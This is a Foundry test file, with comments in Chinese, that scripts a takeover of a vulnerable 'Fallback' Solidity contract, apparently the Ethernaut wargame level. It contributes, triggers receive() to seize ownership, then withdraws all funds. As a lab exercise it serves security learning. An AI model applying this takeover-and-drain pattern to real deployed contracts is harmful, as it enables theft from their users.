// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackAttackTest is Test {
    Fallback public target;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // 部署合约，模拟真实环境
        target = new Fallback();
        // 给攻击者一点ETH
        vm.deal(attacker, 1 ether);
    }

    function test_attack() public {
        // 攻击者身份开始
        vm.startPrank(attacker);

        // 确认攻击前 owner 不是我们
        assertNotEq(target.owner(), attacker, "attack not started yet");

        // 第一步：捐款建立 contributions 记录
        target.contribute{value: 0.0001 ether}();
        assertGt(target.contributions(attacker), 0, "contribution failed");

        // 第二步：直接转ETH触发 receive()，夺取owner
        (bool success,) = address(target).call{value: 0.0001 ether}("");
        require(success, "transfer failed");

        // 确认已经夺取 owner
        assertEq(target.owner(), attacker, "owner takeover failed");

        // 第三步：提走合约里所有ETH
        uint256 balanceBefore = attacker.balance;
        target.withdraw();
        assertGt(attacker.balance, balanceBefore, "withdraw failed");

        vm.stopPrank();

        console.log("Attack successful!");
        console.log("Attacker balance after:", attacker.balance);
    }
}